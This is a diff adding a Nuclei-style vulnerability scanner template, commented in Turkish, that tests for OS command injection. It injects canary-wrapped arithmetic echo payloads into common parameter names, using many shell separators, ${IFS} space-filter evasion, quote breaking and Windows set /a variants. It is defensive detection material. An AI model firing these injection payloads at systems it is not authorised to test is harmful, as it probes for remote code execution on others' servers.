@@ -1,0 +1,112 @@
+id: os-command-injection
+
+info:
+  name: OS Command Injection Detection (İşletim Sistemi Komut Enjeksiyonu)
+  author: ertansa
+  severity: critical
+  description: |
+    Yaygın parametrelere birden fazla kabuk ayıracı (; | || && arka-tik $() yeni-satır)
+    ile aritmetik tabanlı komut yükü enjekte eder ve sonucun ($((1337*1337)) = 1787569)
+    yanıt gövdesinde HESAPLANMIŞ olarak ve benzersiz kanaryaya sarılı biçimde dönüp
+    dönmediğini denetler. Komut yalnızca gerçekten çalıştırıldığında kanarya+1787569
+    birlikte görüneceği için (salt yansıma değil) yanlış pozitif çok düşüktür.
+    Unix (bash aritmetiği) ve Windows (set /a) kabuklarını kapsar. İngilizce + Türkçe
+    parametre adlarını içerir. -dast gerektirmez (yükler yaygın sorgu parametrelerine eklenir).
+    OWASP Top 10: A03:2021 - Injection.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+    - https://portswigger.net/web-security/os-command-injection
+    - https://book.hacktricks.xyz/pentesting-web/command-injection
+  classification:
+    cwe-id: CWE-78
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    max-request: 435
+  tags: cmdi,rce,injection,owasp,owasp-a03
+
+variables:
+  rnd: "{{rand_base(6)}}"
+
+http:
+  - method: GET
+    attack: clusterbomb
+    payloads:
+      param:
+        - "cmd"
+        - "exec"
+        - "command"
+        - "run"
+        - "ping"
+        - "host"
+        - "ip"
+        - "query"
+        - "search"
+        - "q"
+        - "id"
+        - "file"
+        - "url"
+        - "dns"
+        - "domain"
+        - "system"
+        - "data"
+        - "arg"
+        - "input"
+        - "target"
+        - "addr"
+        # Türkçe parametre adları
+        - "komut"
+        - "calistir"
+        - "sunucu"
+        - "adres"
+        - "dosya"
+        - "ara"
+        - "hedef"
+        - "girdi"
+      cmd:
+        # Unix (bash aritmetiği) — kanaryaya sarılı, yalnızca çalıştırılınca 1787569 döner
+        - ";echo {{rnd}}$((1337*1337)){{rnd}}"
+        - "|echo {{rnd}}$((1337*1337)){{rnd}}"
+        - "||echo {{rnd}}$((1337*1337)){{rnd}}"
+        - "&&echo {{rnd}}$((1337*1337)){{rnd}}"
+        - "`echo {{rnd}}$((1337*1337)){{rnd}}`"
+        - "$(echo {{rnd}}$((1337*1337)){{rnd}})"
+        - "%0aecho {{rnd}}$((1337*1337)){{rnd}}"
+        - "%0d%0aecho {{rnd}}$((1337*1337)){{rnd}}"
+        # Boşluk filtresi atlatma: ${IFS}
+        - ";echo${IFS}{{rnd}}$((1337*1337)){{rnd}}"
+        # Tırnak bağlamını kırma (string içi enjeksiyon)
+        - "';echo {{rnd}}$((1337*1337)){{rnd}};'"
+        - "\";echo {{rnd}}$((1337*1337)){{rnd}};\""
+        # Alt-kabuk + yorum ile kuyruk kırpma
+        - ";echo {{rnd}}$((1337*1337)){{rnd}}#"
+        # Windows (set /a) — kanarya echo + aritmetik
+        - "&echo {{rnd}}&set /a 1337*1337"
+        - "|echo {{rnd}}&set /a 1337*1337"
+        - "&&echo {{rnd}}&set /a 1337*1337"
+    path:
+      - "{{BaseURL}}?{{param}}={{cmd}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      # Unix: kanarya+1787569+kanarya bitişik → komut değerlendirildi (salt yansıma değil)
+      - type: dsl
+        name: unix-command-executed
+        dsl:
+          - "contains(body, rnd + '1787569' + rnd)"
+
+      # Windows: kanarya VE 1787569 gövdede, ham ifade yansımamış (unix zaten eşleşmediyse)
+      - type: dsl
+        name: windows-command-executed
+        dsl:
+          - "contains(body, rnd)"
+          - "contains(body, '1787569')"
+          - "!contains(body, '1337*1337')"
+          - "!contains(body, rnd + '1787569' + rnd)"
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - "'Komut enjeksiyonu dogrulandi: $((1337*1337)) = 1787569 (parametre: ' + param + ')'"
